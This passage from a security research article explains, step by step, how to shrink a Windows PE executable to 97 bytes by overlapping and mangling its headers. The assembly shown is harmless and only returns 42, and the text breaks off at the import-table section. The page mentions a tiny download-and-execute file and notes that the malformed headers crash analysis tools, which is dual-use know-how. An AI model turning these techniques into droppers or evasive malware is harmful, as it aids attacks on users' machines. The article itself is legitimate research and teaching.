@@ -1,0 +1,1355 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Tiny PE</title>
+<style type="text/css">
+			body, td, th { font-family: Arial, Helvetica, sans-serif; }
+			pre, code, kbd, tt, samp { font-family: 'Courier New', 'Courier', 'Lucida Console', 'Monaco', monospace; }
+			img { border: 0; }
+			#sidebar ul.comingup p.location { margin: 3px 0 1em 0; font-size: 0.85em; }
+			#navbar form.search input#search-text { vertical-align: top; }
+			#navbar form.search input#search-image { vertical-align: top; }
+
+			/*#content.research span.unpatched { color: red; font-size: 0.85em; }*/
+		</style>
+<style type="text/css">
+			@import "../../phreedom.css";
+		</style>
+<style type="text/css" media="all">
+        h4 { margin-top: 1.5em; margin-bottom: 0.8em; }
+        pre.code { margin-left: 1.5em; }
+        p.download { margin-bottom: 2em; }
+
+		div.virustotal {
+			width: 42em;
+		}
+
+		div.virustotal table {
+			border-top: 1px solid black;
+			border-right: 1px solid black;
+			border-bottom: 1px solid black;
+				
+			width: 100%;
+			margin-bottom: 1em;
+		}
+
+		div.virustotal thead td {
+			background: #cccccc;
+			color: #555555;
+			font-weight: bold;
+			text-indent: 3px;
+			border-left: 1px solid black;
+			border-bottom: 1px solid black;
+		}
+
+		div.virustotal tbody td {
+			text-indent: 2px;
+			border-left: 1px solid black;
+			border-bottom: 1px solid #cccccc;
+		}
+
+		div.virustotal td.positive {
+			color: #990000;
+		}
+
+		div.virustotal td.negative {
+			color: #739999;
+		}
+    </style>
+<!--[if lt IE 8]>
+			<link rel="stylesheet" href="../../ie7.css" type="text/css"/>
+		<![endif]--><!--[if lt IE 7]>
+			<link rel="stylesheet" href="../../ie6.css" type="text/css"/>
+		<![endif]--><!--[if lt IE 6]>
+			<link rel="stylesheet" href="../../ie5.css" type="text/css"/>
+		<![endif]--><link rel="alternate" type="application/atom+xml" href="../../blog/atom.xml">
+</head>
+<body onload="phreedom.onload()">
+<div id="page"><div class="page-top"><div class="page-left"><div class="page-bottom"><div class="page-right"><div class="page-topleft"><div class="page-topright"><div class="page-bottomright"><div class="page-bottomleft"><div class="page-content">
+<div id="header">
+<h1>Security Research</h1>
+<p class="subtitle">by Alexander Sotirov</p>
+</div>
+<div id="navbar" style="clear:both">
+<h2>Navigation</h2>
+<div class="navbar-topleft"><div class="navbar-topright"><div class="navbar-bottomright"><div class="navbar-bottomleft"><div class="navbar-content">
+<ul class="menu">
+<li><a href="/">Blog</a></li>
+<li class="current"><a href="../../research/">Research</a></li>
+<li><a href="../../presentations/">Presentations</a></li>
+<li><a href="../../software/">Software</a></li>
+<li><a href="../../about/">About</a></li>
+</ul>
+<form class="search" action="http://www.google.com/cse" method="get"><div>
+<input type="hidden" name="cx" value="015960576831297768215:tprxtx55gig"><input type="hidden" name="ie" value="UTF-8"><input id="search-text" type="text" name="q" size="20" maxlength="256" title="Search query"><input id="search-image" type="image" name="sa" value="Search" src="../../images/find.png" alt="Submit">
+</div></form>
+</div></div></div></div></div>
+</div>
+<div id="sidebar">
+<h2>Resources</h2>
+<h3>Latest posts</h3>
+<ul class="latest">
+<li><a href="../../blog/2011/assured-exploitation-2011/">Assured Exploitation 2011</a></li>
+<li><a href="../../blog/2011/you-should-work-for-symantec/">You Should Work for Symantec</a></li>
+<li><a href="../../blog/2010/csaw-final-challenge/">CSAW final challenge</a></li>
+<li><a href="../../blog/2010/csaw-reversing-challenge/">CSAW reversing challenge</a></li>
+<li><a href="../../blog/2010/darknet-design/">Darknet design</a></li>
+</ul>
+<h3>Archives</h3>
+<ul><li>
+<a href="../../blog/2011/">2011</a>
+							|
+						<a href="../../blog/2010/">2010</a>
+							|
+						<a href="../../blog/2009/">2009</a>
+							|
+						<a href="../../blog/2008/">2008</a>
+</li></ul>
+<h3>Follow</h3>
+<ul>
+<li><a class="external" href="http://twitter.com/alexsotirov/">Twitter</a></li>
+<li><a href="../../blog/atom.xml">Blog feed <img src="../../images/feed.png" width="12px" height="12px" alt="Feed icon"></a></li>
+</ul>
+<h3>Contact</h3>
+<ul>
+<li><a href="mailto:alex@sotirov.net">alex@sotirov.net</a></li>
+<li><a href="../../asotirov.pgp">PGP key</a></li>
+</ul>
+<h3>Meet me at</h3>
+<ul class="comingup">
+<li>
+<a class="external" href="http://www.cansecwest.com">CanSecWest</a><p class="location">Vancouver, Mar 9-11</p>
+</li>
+<li>
+<a class="external" href="https://www.immunityinc.com/infiltrate.shtml">Infiltrate</a><p class="location">Miami Beach, Apr 16-17</p>
+</li>
+</ul>
+</div>
+<div id="content">
+
+<h2>Tiny PE</h2>
+
+<p>Translations: <a href="http://www.fergonez.net/tinype.html">português brasileiro</a></p>
+
+<h3>Creating the smallest possible PE executable</h3>
+
+<p>This work was inspired by the Tiny PE <a href="http://blogs.securiteam.com/index.php/archives/675">challenge</a>
+by Gil Dabah. The object of the challenge was to write the smallest PE file
+that downloads a file from the Internet and executes it.</p>
+
+
+
+<p>In the process of writing increasingly smaller PE files for the challenge I
+learned a lot of interesting details about the PE file format and the Windows
+loader. The goal of this document is to preserve this knowledge for future reference. In this,
+I have followed the example of the famous <a href="http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html">Whirlwind Tutorial on Creating Really Teensy ELF Executables for Linux</a>.</p>
+
+<h3>Summary</h3>
+
+<p>If you are too busy to read the entire page, here is a summary of the
+results:</p>
+
+<ul>
+    <li>Smallest possible PE file: <a href="tiny.97">97 bytes</a>
+</li>
+    <li>Smallest possible PE file on Windows 2000: <a href="tiny.import.133">133 bytes</a>
+</li>
+    <li>Smallest PE file that downloads a file over WebDAV and executes it: <a href="tiny.webdav.133">133 bytes</a>
+</li>
+</ul>
+
+<p>The files above are the smallest possible PE files due to requirements of
+the PE file format and cannot be improved further. Take this as a challenge if
+you wish ;-)</p>
+
+<p><b>UPDATE:</b> Many before me had made similar claims and just like them I
+turned out to be wrong. Thanks to Peter Ferrie for pointing out that you can
+remove the last field from the 137 byte file and bring the file size down to
+133 bytes.</p>
+
+<p>You can also download an archive with all source code and executables from
+this page:</p>
+
+<ul>
+    <li>
+<a href="tinype.zip">tinype.zip</a>
+        (GPG <a href="tinype.zip.sig">.sig</a>)</li>
+</ul>
+
+<p>For details about how these results were achieved, read below.</p>
+
+
+<h2>Smallest possible PE file</h2>
+
+<p>Our first task will be to build the smallest possible PE file that can be
+loaded and executed by Windows. We'll start with a simple C program:</p>
+
+
+<h3>Compiling a simple C program</h3>
+
+<pre class="code">
+int main()
+{
+    return 42;
+}
+</pre>
+
+<p>We'll compile and link this program with Visual Studio 2005:</p>
+
+<pre class="code">
+cl /nologo /c tiny.c
+link /nologo tiny.obj
+</pre>
+
+<p>The resulting file size is <b>45056</b> bytes. This is clearly unacceptable.</p>
+
+<p class="download">
+    <a href="tiny.c.45056/tiny.c">tiny.c</a> |
+    <a href="tiny.c.45056/tiny.exe">tiny.exe</a> |
+    <a href="tiny.c.45056/tiny.dump">dumpbin</a> |
+    <a href="tiny.c.45056/Makefile">Makefile</a>
+</p>
+
+
+<h3>Removing the C Runtime Library</h3>
+
+<p>A very large part of the binary consists of the C Runtime Library. If
+we link the same program with the <span class="code">/NODEFAULTLIB</span>
+option, we'll get a much smaller output file. We will also remove the console
+window from the program by setting the subsystem to Win32 GUI.</p>
+
+<pre class="code">
+cl /nologo /c /O1 tiny.c
+link /nologo /ENTRY:main /NODEFAULTLIB /SUBSYSTEM:WINDOWS tiny.obj
+</pre>
+
+<p>The <span class="code">/O1</span> compiler option optimizes the code for
+size. A disassembly of the .text section shows that main function was optimized
+down to 4 bytes:</p>
+
+<pre class="code">
+00401000: 6A 2A              push        2Ah
+00401002: 58                 pop         eax
+00401003: C3                 ret
+</pre>
+
+<p>The size of the PE file is now <b>1024</b> bytes.</p>
+
+<p class="download">
+    <a href="tiny.c.1024/tiny.c">tiny.c</a> |
+    <a href="tiny.c.1024/tiny.exe">tiny.exe</a> |
+    <a href="tiny.c.1024/tiny.dump">dumpbin</a> |
+    <a href="tiny.c.1024/Makefile">Makefile</a>
+</p>
+
+
+<h3>Decreasing the file alignment</h3>
+
+<p>If we look at the dumpbin <a href="tiny.c.1024/tiny.dump">output</a> for the
+1024 byte file, we'll see that the file alignment is set to 512 bytes. The
+contents of the .text section start at offset 0x200 in the file. The space
+between the header and the .text section is filled with zeros.</p>
+
+<p>The official PE specification states that the minimim file alignment is 512,
+but the Microsoft linker can produce PE files with smaller alignment. The
+Windows loader ignores the invalid alignment and is able to execute the file.
+</p>
+
+<pre class="code">
+cl /c /O1 tiny.c
+link /nologo /ENTRY:main /NODEFAULTLIB /SUBSYSTEM:WINDOWS /ALIGN:1 tiny.obj
+</pre>
+
+<p>The size of the PE file is now <b>468</b> bytes.</p>
+
+<p class="download">
+    <a href="tiny.c.468/tiny.c">tiny.c</a> |
+    <a href="tiny.c.468/tiny.exe">tiny.exe</a> |
+    <a href="tiny.c.468/tiny.dump">dumpbin</a> |
+    <a href="tiny.c.468/Makefile">Makefile</a>
+</p>
+
+
+<h3>Switching to assembly and removing the DOS stub</h3>
+
+<p>To shrink the file even further, we need to be able to edit all fields in
+the PE header. We'll disassemble our 468 byte C program and convert it to
+assembly source that can be assembled with
+<a href="http://www.kernel.org/pub/software/devel/nasm/">NASM</a>. We'll use
+the following command to build our PE file:</p>
+
+<pre class="code">
+nasm -f bin -o tiny.exe tiny.asm
+</pre>
+
+<p>The only change we'll make is to remove the DOS stub that prints the message
+<span class="code">This program cannot be run in DOS mode.</span> PE files
+still need an MZ header, but the only two fields that are used are e_magic and
+e_lfanew. We can fill the rest of the MZ header with zeros. Similarly, there
+are many other unused fields in the PE header that can be modified without
+breaking the program. In the source code below they are highlighted in red.</p>
+
+<p>For a detailed description of the PE file format, please refer to the
+official <a href="http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/pecoff_v8.doc">specification</a> from Microsoft
+and Matt Pietrek's <i>An In-Depth Look into the Win32 Portable Executable File
+Format</i>: <a href="http://msdn.microsoft.com/msdnmag/issues/02/02/PE/print.asp">Part 1</a>
+and <a href="http://msdn.microsoft.com/msdnmag/issues/02/03/PE2/print.asp">Part 2</a>.</p>
+
+<pre class="code">
+; tiny.asm
+
+BITS 32
+
+;
+; MZ header
+;
+; The only two fields that matter are e_magic and e_lfanew
+
+mzhdr:
+    dw "MZ"                       ; e_magic
+<span style="color: red;">    dw 0                          ; e_cblp UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_cp UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_crlc UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_cparhdr UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_minalloc UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_maxalloc UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_ss UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_sp UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_csum UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_ip UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_cs UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_lsarlc UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_ovno UNUSED</span>
+<span style="color: red;">    times 4 dw 0                  ; e_res UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_oemid UNUSED</span>
+<span style="color: red;">    dw 0                          ; e_oeminfo UNUSED</span>
+<span style="color: red;">    times 10 dw 0                 ; e_res2 UNUSED</span>
+    dd pesig                      ; e_lfanew
+
+;
+; PE signature
+;
+
+pesig:
+    dd "PE"
+
+;
+; PE header
+;
+
+pehdr:
+    dw 0x014C                     ; Machine (Intel 386)
+    dw 1                          ; NumberOfSections
+<span style="color: red;">    dd 0x4545BE5D                 ; TimeDateStamp UNUSED</span>
+<span style="color: red;">    dd 0                          ; PointerToSymbolTable UNUSED</span>
+<span style="color: red;">    dd 0                          ; NumberOfSymbols UNUSED</span>
+    dw opthdrsize                 ; SizeOfOptionalHeader
+    dw 0x103                      ; Characteristics (no relocations, executable, 32 bit)
+
+;
+; PE optional header
+;
+
+filealign equ 1
+sectalign equ 1
+
+%define round(n, r) (((n+(r-1))/r)*r)
+
+opthdr:
+    dw 0x10B                      ; Magic (PE32)
+<span style="color: red;">    db 8                          ; MajorLinkerVersion UNUSED</span>
+<span style="color: red;">    db 0                          ; MinorLinkerVersion UNUSED</span>
+<span style="color: red;">    dd round(codesize, filealign) ; SizeOfCode UNUSED</span>
+<span style="color: red;">    dd 0                          ; SizeOfInitializedData UNUSED</span>
+<span style="color: red;">    dd 0                          ; SizeOfUninitializedData UNUSED</span>
+    dd start                      ; AddressOfEntryPoint
+<span style="color: red;">    dd code                       ; BaseOfCode UNUSED</span>
+<span style="color: red;">    dd round(filesize, sectalign) ; BaseOfData UNUSED</span>
+    dd 0x400000                   ; ImageBase
+    dd sectalign                  ; SectionAlignment
+    dd filealign                  ; FileAlignment
+<span style="color: red;">    dw 4                          ; MajorOperatingSystemVersion UNUSED</span>
+<span style="color: red;">    dw 0                          ; MinorOperatingSystemVersion UNUSED</span>
+<span style="color: red;">    dw 0                          ; MajorImageVersion UNUSED</span>
+<span style="color: red;">    dw 0                          ; MinorImageVersion UNUSED</span>
+    dw 4                          ; MajorSubsystemVersion
+<span style="color: red;">    dw 0                          ; MinorSubsystemVersion UNUSED</span>
+<span style="color: red;">    dd 0                          ; Win32VersionValue UNUSED</span>
+    dd round(filesize, sectalign) ; SizeOfImage
+    dd round(hdrsize, filealign)  ; SizeOfHeaders
+<span style="color: red;">    dd 0                          ; CheckSum UNUSED</span>
+    dw 2                          ; Subsystem (Win32 GUI)
+<span style="color: red;">    dw 0x400                      ; DllCharacteristics UNUSED</span>
+<span style="color: red;">    dd 0x100000                   ; SizeOfStackReserve UNUSED</span>
+    dd 0x1000                     ; SizeOfStackCommit
+    dd 0x100000                   ; SizeOfHeapReserve
+<span style="color: red;">    dd 0x1000                     ; SizeOfHeapCommit UNUSED</span>
+<span style="color: red;">    dd 0                          ; LoaderFlags UNUSED</span>
+<span style="color: red;">    dd 16                         ; NumberOfRvaAndSizes UNUSED</span>
+
+;
+; Data directories
+;
+
+    times 16 dd 0, 0
+
+opthdrsize equ $ - opthdr
+
+;
+; PE code section
+;
+
+    db ".text", 0, 0, 0           ; Name
+    dd codesize                   ; VirtualSize
+    dd round(hdrsize, sectalign)  ; VirtualAddress
+    dd round(codesize, filealign) ; SizeOfRawData
+    dd code                       ; PointerToRawData
+<span style="color: red;">    dd 0                          ; PointerToRelocations UNUSED</span>
+<span style="color: red;">    dd 0                          ; PointerToLinenumbers UNUSED</span>
+<span style="color: red;">    dw 0                          ; NumberOfRelocations UNUSED</span>
+<span style="color: red;">    dw 0                          ; NumberOfLinenumbers UNUSED</span>
+<span style="color: red;">    dd 0x60000020                 ; Characteristics (code, execute, read) UNUSED</span>
+
+hdrsize equ $ - $$
+
+;
+; PE code section data
+;
+
+align filealign, db 0
+
+code:
+
+; Entry point
+
+start:
+    push byte 42
+    pop eax
+    ret
+
+codesize equ $ - code
+
+filesize equ $ - $$
+</pre>
+
+<p>To find out which fields are used and which can be freely modified, we
+used a simple <a href="unused.rb">asm fuzzer</a> written in Ruby. It iterates
+through all header fields in the assembly source and replaces them with
+semi-random values. If the resulting program crashes or fails to return 42, we
+conclude that the field is in use.</p>
+
+<p>The size of the assembled PE file is now <b>356</b> bytes.</p>
+
+<p class="download">
+    <a href="tiny.356/tiny.asm">tiny.asm</a> |
+    <a href="tiny.356/tiny.exe">tiny.exe</a> |
+    <a href="tiny.356/tiny.dump">dumpbin</a> |
+    <a href="tiny.356/Makefile">Makefile</a>
+</p>
+
+
+<h3>Collapsing the MZ header</h3>
+
+<p>The e_lfanew field in the MZ header contains the offset of the PE header
+from the beginning of the file. Usually the PE header begins after the MZ
+header and the DOS stub, but if we set e_lfanew to a value smaller than the
+0x40, the PE header will start inside the MZ header. This allows us to merge
+some of the data of the MZ and PE headers and produce a smaller file.</p>
+
+<p>The PE header cannot start at offset 0, because we need the first two bytes
+of the file to be "MZ". According to the PE specification, the PE header must
+be aligned on a 8 byte boundary, but the Windows loader requires only a 4 byte
+alignment. This means that the smallest possible value for e_lfanew is 4.</p>
+
+<p>If the PE header starts at offset 4, most of it will overwrite unused fields
+in the MZ header. The only field we need to be careful with is e_lfanew, which
+is at the same offset as SectionAlignment. Since e_lfanew must be 4, we have to
+set SectionAlignment to 4 as well. The PE specification says that if the
+section alignment is less than the page size, the file alignment must have the
+same value, so we have to set both SectionAlignment and FileAlignment to 4.
+Fortunately the section data in our PE file is already aligned on a 4 byte
+boundary, so changing the file alignment from 1 to 4 doesn't increase the file
+size.</p>
+
+<pre class="code">
+;
+; MZ header
+;
+; The only two fields that matter are e_magic and e_lfanew
+
+mzhdr:
+    dw "MZ"       ; e_magic
+<span style="color: red;">    dw 0          ; e_cblp UNUSED</span>
+
+;
+; PE signature
+;
+
+pesig:
+    dd "PE"       ; e_cp, e_crlc UNUSED       ; PE signature
+
+;
+; PE header
+;
+
+pehdr:
+    dw 0x014C     ; e_cparhdr UNUSED          ; Machine (Intel 386)
+    dw 1          ; e_minalloc UNUSED         ; NumberOfSections
+<span style="color: red;">    dd 0x4545BE5D ; e_maxalloc, e_ss UNUSED   ; TimeDateStamp UNUSED</span>
+<span style="color: red;">    dd 0          ; e_sp, e_csum UNUSED       ; PointerToSymbolTable UNUSED</span>
+<span style="color: red;">    dd 0          ; e_ip, e_cs UNUSED         ; NumberOfSymbols UNUSED</span>
+    dw opthdrsize ; e_lsarlc UNUSED           ; SizeOfOptionalHeader
+    dw 0x103      ; e_ovno UNUSED             ; Characteristics
+
+;
+; PE optional header
+;
+
+filealign equ 4
+sectalign equ 4   ; must be 4 because of e_lfanew
+
+%define round(n, r) (((n+(r-1))/r)*r)
+
+opthdr:
+    dw 0x10B      ; e_res UNUSED              ; Magic (PE32)
+<span style="color: red;">    db 8                                      ; MajorLinkerVersion UNUSED</span>
+<span style="color: red;">    db 0                                      ; MinorLinkerVersion UNUSED</span>
+<span style="color: red;">    dd round(codesize, filealign)             ; SizeOfCode UNUSED</span>
+<span style="color: red;">    dd 0          ; e_oemid, e_oeminfo UNUSED ; SizeOfInitializedData UNUSED</span>
+<span style="color: red;">    dd 0          ; e_res2 UNUSED             ; SizeOfUninitializedData UNUSED</span>
+    dd start                                  ; AddressOfEntryPoint
+<span style="color: red;">    dd code                                   ; BaseOfCode UNUSED</span>
+<span style="color: red;">    dd round(filesize, sectalign)             ; BaseOfData UNUSED</span>
+    dd 0x400000                               ; ImageBase
+    dd sectalign  ; e_lfanew                  ; SectionAlignment
+</pre>
+
+<p>Collapsing the MZ header reduces the file size to <b>296</b> bytes.</p>
+
+<p class="download">
+    <a href="tiny.296/tiny.asm">tiny.asm</a> |
+    <a href="tiny.296/tiny.exe">tiny.exe</a> |
+    <a href="tiny.296/tiny.dump">dumpbin</a> |
+    <a href="tiny.296/Makefile">Makefile</a>
+</p>
+
+
+<h3>Removing the data directories</h3>
+
+<p>The data directories at the end of the PE optional header usually contain
+pointers to the import and export tables, debugging information, relocations
+and other OS specific data. Our PE file doesn't use any of these features and
+its data directories are empty. If we can remove the data directories from the
+file, we'll save a lot of space.</p>
+
+<p>The PE specification says that the number of data directories is specified
+in the NumberOfRvaAndSizes header field and the size of the PE optional header
+is variable. If we set NumberOfRvaAndSizes to 0 and decrease
+SizeOfOptionalHeader, we can remove the data directories from the file.</p>
+
+<pre class="code">
+    dd 0                                      ; NumberOfRvaAndSizes
+</pre>
+
+<p>Most functions that read the data directories check if NumberOfRvaAndSizes
+is large enough to avoid accessing invalid memory. The only exception is the
+Debug directory on Windows XP. If the size of the Debug directory is not 0,
+regardless of NumberOfRvaAndSizes, the loader will crash with an access
+violation in <span class="code">ntdll!LdrpCheckForSecuROMImage</span>. We need
+to ensure that the dword at offset 0x94 from the beginning of the optional
+header is always 0. In our PE file this address is outside the memory mapped
+file and is zeroed by the OS.</p>
+
+<p>The size of the PE file is only <b>168</b> bytes, a significant
+improvement.</p>
+
+<p class="download">
+    <a href="tiny.168/tiny.asm">tiny.asm</a> |
+    <a href="tiny.168/tiny.exe">tiny.exe</a> |
+    <a href="tiny.168/tiny.dump">dumpbin</a> |
+    <a href="tiny.168/Makefile">Makefile</a>
+</p>
+
+
+<h3>Collapsing the PE section header</h3>
+
+<p>The Windows loader expects to find the PE section headers after the optional
+header. It calculates the address of the first section header by adding
+SizeOfOptionalHeader to the beginning of the optional header. However, the code
+that accesses the fields of the optional header never checks its size. We can
+set SizeOfOptionalHeader to a value smaller than the real size, and move the PE
+section into the unused space in the optional header. This is illustrated by
+the code below:</p>
+
+<pre class="code">
+    dw sections-opthdr ; e_lsarlc UNUSED      ; SizeOfOptionalHeader
+    dw 0x103      ; e_ovno UNUSED             ; Characteristics
+
+;
+; PE optional header
+;
+; The debug directory size at offset 0x94 from here must be 0
+
+filealign equ 4
+sectalign equ 4   ; must be 4 because of e_lfanew
+
+%define round(n, r) (((n+(r-1))/r)*r)
+
+opthdr:
+    dw 0x10B      ; e_res UNUSED              ; Magic (PE32)
+<span style="color: red;">    db 8                                      ; MajorLinkerVersion UNUSED</span>
+<span style="color: red;">    db 0                                      ; MinorLinkerVersion UNUSED</span>
+
+;
+; PE code section
+;
+
+sections:
+<span style="color: red;">    dd round(codesize, filealign)             ; SizeOfCode UNUSED                  ; Name UNUSED</span>
+<span style="color: red;">    dd 0          ; e_oemid, e_oeminfo UNUSED ; SizeOfInitializedData UNUSED</span>
+    dd codesize   ; e_res2 UNUSED             ; SizeOfUninitializedData UNUSED     ; VirtualSize
+    dd start                                  ; AddressOfEntryPoint                ; VirtualAddress
+    dd codesize                               ; BaseOfCode UNUSED                  ; SizeOfRawData
+    dd start                                  ; BaseOfData UNUSED                  ; PointerToRawData
+    dd 0x400000                               ; ImageBase                          ; PointerToRelocations UNUSED
+    dd sectalign  ; e_lfanew                  ; SectionAlignment                   ; PointerToLinenumbers UNUSED
+    dd filealign                              ; FileAlignment                      ; NumberOfRelocations, NumberOfLinenumbers UNUSED
+<span style="color: red;">    dw 4                                      ; MajorOperatingSystemVersion UNUSED ; Characteristics UNUSED</span>
+<span style="color: red;">    dw 0                                      ; MinorOperatingSystemVersion UNUSED</span>
+<span style="color: red;">    dw 0                                      ; MajorImageVersion UNUSED</span>
+<span style="color: red;">    dw 0                                      ; MinorImageVersion UNUSED</span>
+    dw 4                                      ; MajorSubsystemVersion
+<span style="color: red;">    dw 0                                      ; MinorSubsystemVersion UNUSED</span>
+<span style="color: red;">    dd 0                                      ; Win32VersionValue UNUSED</span>
+    dd round(filesize, sectalign)             ; SizeOfImage
+    dd round(hdrsize, filealign)              ; SizeOfHeaders
+<span style="color: red;">    dd 0                                      ; CheckSum UNUSED</span>
+    dw 2                                      ; Subsystem (Win32 GUI)
+<span style="color: red;">    dw 0x400                                  ; DllCharacteristics UNUSED</span>
+<span style="color: red;">    dd 0x100000                               ; SizeOfStackReserve</span>
+    dd 0x1000                                 ; SizeOfStackCommit
+    dd 0x100000                               ; SizeOfHeapReserve
+<span style="color: red;">    dd 0x1000                                 ; SizeOfHeapCommit UNUSED</span>
+<span style="color: red;">    dd 0                                      ; LoaderFlags UNUSED</span>
+<span style="color: red;">    dd 0                                      ; NumberOfRvaAndSizes UNUSED</span>
+
+hdrsize equ $ - $$
+
+;
+; PE code section data
+;
+
+align filealign, db 0
+
+; Entry point
+
+start:
+    push byte 42
+    pop eax
+    ret
+
+codesize equ $ - start
+
+filesize equ $ - $$
+</pre>
+
+<p>This kind of header mangling causes dumpbin to crash, but the WinDbg !dh
+command can still parse the header correctly. The size of the PE file is now
+<b>128</b> bytes.</p>
+
+<p class="download">
+    <a href="tiny.128/tiny.asm">tiny.asm</a> |
+    <a href="tiny.128/tiny.exe">tiny.exe</a> |
+    <a href="tiny.128/Makefile">Makefile</a>
+</p>
+
+
+<h3>The smallest possible PE file</h3>
+
+<p>The next step is obvious: we can move the 4 bytes of code into one of the
+unused fields of the header, such as the TimeDateStamp field. This leaves the
+end of optional header at the end of the PE file. It looks like we can't reduce
+the file size any further, because the PE header starts at the smallest
+possible offset and has a fixed size. It is followed by the PE optional header,
+which also starts at the smallest offset possible. All other data in the file
+is contained within these two headers.</p>
+
+<p>Yet there is one more thing we can do. The PE file is mapped on a 4KB memory
+page. Since the file is smaller than 4KB, the rest of the page is filled with
+zeros. If we remove the last few fields of the PE optional header from the
+file, the end of the structure will be mapped on a readable page of memory
+containing zeros. 0 is a valid value for the last seven fields of the optional
+header, allowing us to remove them and save another 26 bytes.</p>
+
+<p>The last word in the file is the Subsystem field, which must be 2. Since
+Intel is a little-endian architecture, the first byte of the word is 2 and the
+second one is 0. We can store the field as a single byte in the file and save
+an additional byte from the file size.</p>
+
+<p>The full source code of the final PE file is given below:</p>
+
+<pre class="code">
+; tiny.asm
+
+BITS 32
+
+;
+; MZ header
+;
+; The only two fields that matter are e_magic and e_lfanew
+
+mzhdr:
+    dw "MZ"       ; e_magic
+<span style="color: red;">    dw 0          ; e_cblp UNUSED</span>
+
+;
+; PE signature
+;
+
+pesig:
+    dd "PE"       ; e_cp, e_crlc UNUSED       ; PE signature
+
+;
+; PE header
+;
+
+pehdr:
+    dw 0x014C     ; e_cparhdr UNUSED          ; Machine (Intel 386)
+    dw 1          ; e_minalloc UNUSED         ; NumberOfSections
+
+;   dd 0xC3582A6A ; e_maxalloc, e_ss UNUSED   ; TimeDateStamp UNUSED
+
+; Entry point
+
+start:
+    push byte 42
+    pop eax
+    ret
+
+codesize equ $ - start
+
+<span style="color: red;">    dd 0          ; e_sp, e_csum UNUSED       ; PointerToSymbolTable UNUSED</span>
+<span style="color: red;">    dd 0          ; e_ip, e_cs UNUSED         ; NumberOfSymbols UNUSED</span>
+    dw sections-opthdr ; e_lsarlc UNUSED      ; SizeOfOptionalHeader
+    dw 0x103      ; e_ovno UNUSED             ; Characteristics
+
+;
+; PE optional header
+;
+; The debug directory size at offset 0x94 from here must be 0
+
+filealign equ 4
+sectalign equ 4   ; must be 4 because of e_lfanew
+
+%define round(n, r) (((n+(r-1))/r)*r)
+
+opthdr:
+    dw 0x10B      ; e_res UNUSED              ; Magic (PE32)
+<span style="color: red;">    db 8                                      ; MajorLinkerVersion UNUSED</span>
+<span style="color: red;">    db 0                                      ; MinorLinkerVersion UNUSED</span>
+
+;
+; PE code section
+;
+
+sections:
+<span style="color: red;">    dd round(codesize, filealign)             ; SizeOfCode UNUSED                  ; Name UNUSED</span>
+<span style="color: red;">    dd 0          ; e_oemid, e_oeminfo UNUSED ; SizeOfInitializedData UNUSED</span>
+    dd codesize   ; e_res2 UNUSED             ; SizeOfUninitializedData UNUSED     ; VirtualSize
+    dd start                                  ; AddressOfEntryPoint                ; VirtualAddress
+    dd codesize                               ; BaseOfCode UNUSED                  ; SizeOfRawData
+    dd start                                  ; BaseOfData UNUSED                  ; PointerToRawData
+    dd 0x400000                               ; ImageBase                          ; PointerToRelocations UNUSED
+    dd sectalign  ; e_lfanew                  ; SectionAlignment                   ; PointerToLinenumbers UNUSED
+    dd filealign                              ; FileAlignment                      ; NumberOfRelocations, NumberOfLinenumbers UNUSED
+<span style="color: red;">    dw 4                                      ; MajorOperatingSystemVersion UNUSED ; Characteristics UNUSED</span>
+<span style="color: red;">    dw 0                                      ; MinorOperatingSystemVersion UNUSED</span>
+<span style="color: red;">    dw 0                                      ; MajorImageVersion UNUSED</span>
+<span style="color: red;">    dw 0                                      ; MinorImageVersion UNUSED</span>
+    dw 4                                      ; MajorSubsystemVersion
+<span style="color: red;">    dw 0                                      ; MinorSubsystemVersion UNUSED</span>
+<span style="color: red;">    dd 0                                      ; Win32VersionValue UNUSED</span>
+    dd round(hdrsize, sectalign)+round(codesize,sectalign) ; SizeOfImage
+    dd round(hdrsize, filealign)              ; SizeOfHeaders
+<span style="color: red;">    dd 0                                      ; CheckSum UNUSED</span>
+    db 2                                      ; Subsystem (Win32 GUI)
+
+hdrsize equ $ - $$
+
+filesize equ $ - $$
+</pre>
+
+<p>Now we have really reached the limit. The field at offset 0x94 from the
+beginning of the file is Subsystem, which must be set to 2. We cannot remove
+this field or get around it. This must be the smallest possible PE file.</p>
+
+<p>The size of the PE file is an incredible <b>97</b> bytes.</p>
+
+<p class="download">
+    <a href="tiny.97/tiny.asm">tiny.asm</a> |
+    <a href="tiny.97/tiny.exe">tiny.exe</a> |
+    <a href="tiny.97/Makefile">Makefile</a>
+</p>
+
+
+<h2>Smallest PE file with imports</h2>
+
+<p>Unfortunately the 97 byte PE file does not work on Windows 2000. This is
+because the loader tries to call a function from KERNEL32, but KERNEL32.DLL is
+not loaded. All other versions of Windows load it automatically, but on Windows
+2000 we have to make sure that KERNEL32.DLL is listed in the import table of
+the executable. Executing a PE file with no imports is not possible.</p>
+
+<h3>Adding an import table</h3>
+
+<p>The structure of the import table is complicated, but adding a single
+ordinal import from KERNEL32 is relatively simple. We need to put the name of
+the DLL we want to import in the Name field and create two identical arrays
+of IMAGE_THUNK_DATA structures, one for the Import Lookup Table and another one
+for the Import Address Table. When the loader resolves the imports, it
+will read the ordinal from the lookup table and replace the entry in the
+address table with the function address.</p>
+
+<pre class="code">
+    dd 2                                      ; NumberOfRvaAndSizes
+
+;
+; Data directories
+;
+; The debug directory size at offset 0x34 from here must be 0
+
+<span style="color: red;">    dd 0                                      ; Export Table UNUSED</span>
+    dd 0
+    dd idata                                  ; Import Table
+    dd idatasize
+
+hdrsize equ $ - $$
+
+; Import table (array of IMAGE_IMPORT_DESCRIPTOR structures)
+
